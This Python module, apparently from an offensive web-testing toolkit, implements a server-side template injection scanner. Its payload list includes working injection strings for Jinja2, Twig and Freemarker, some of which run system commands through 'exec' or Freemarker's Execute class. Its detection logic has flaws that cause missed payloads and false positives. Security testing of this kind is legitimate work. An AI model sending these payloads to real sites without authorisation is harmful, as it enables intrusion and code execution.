# modules/vuln_scanner/ssti_scanner.py

"""
Server-Side Template Injection Scanner
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Detects SSTI vulnerabilities in various template engines
including Jinja2, Twig, Freemarker, and Velocity.
"""

import re
from typing import Dict, List, Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs

import requests
from requests.exceptions import RequestException


class SSTIScanner:
    """
    Server-Side Template Injection scanner.
    
    Tests for SSTI across multiple template engines
    using engine-specific syntax and expressions.
    """
    
    SSTI_PAYLOADS = {
        'generic': [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
            '{{7*\'7\'}}',
        ],
        'jinja2': [
            '{{config}}',
            '{{self.__init__.__globals__}}',
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            '{{request.application.__globals__}}',
        ],
        'twig': [
            '{{_self.env.registerUndefinedFilterCallback("exec")}}',
            '{{_self.env.getFilter("id")}}',
        ],
        'freemarker': [
            '${7*7}',
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        ],
    }
    
    SSTI_RESULT_PATTERNS = [
        r'49',
        r'7777777',
        r'<class',
        r'__globals__',
        r'<Config',
        r'<module',
        r'<class.*__main__',
        r'flask\.config',
        r'django\.conf',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the SSTI scanner.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.errors: List[str] = []
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract URL parameters."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        param_dict = {}
        for key, values in params.items():
            param_dict[key] = values[0] if values else ''
        
        return param_dict
    
    def test_parameter(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test a single parameter for SSTI.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for engine, payloads in self.SSTI_PAYLOADS.items():
            for payload in payloads[:3]:
                parsed = urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                params = self.extract_parameters(url)
                params[parameter] = payload
                
                test_url = base_url + '?' + urlencode(params)
                
                try:
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )
                    
                    for pattern in self.SSTI_RESULT_PATTERNS:
                        if re.search(pattern, response.text):
                            return {
                                'url': test_url,
                                'parameter': parameter,
                                'engine': engine,
                                'payload': payload,
                                'pattern_matched': pattern,
                            }
                            
                except RequestException:
                    continue
        
        return None
    
    def run(self) -> Dict[str, Any]:
        """
        Run SSTI scan.
        
        Returns:
            Dictionary with scan results
        """
        params = self.extract_parameters(self.target)
        
        for param_name in params:
            result = self.test_parameter(self.target, param_name)
            
            if result:
                self.vulnerabilities.append(result)
        
        findings = []
        
        for vuln in self.vulnerabilities:
            findings.append({
                'type': 'Server-Side Template Injection (SSTI)',
                'severity': 'critical',
                'endpoint': vuln['url'],
                'parameter': vuln['parameter'],
                'description': f"SSTI detected in {vuln['engine']} template engine via parameter '{vuln['parameter']}'",
                'evidence': vuln,
                'remediation': 'Use sandboxed template engines. Do not allow user input in templates. Use logic-less templates.',
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'vulnerabilities_found': len(findings),
        }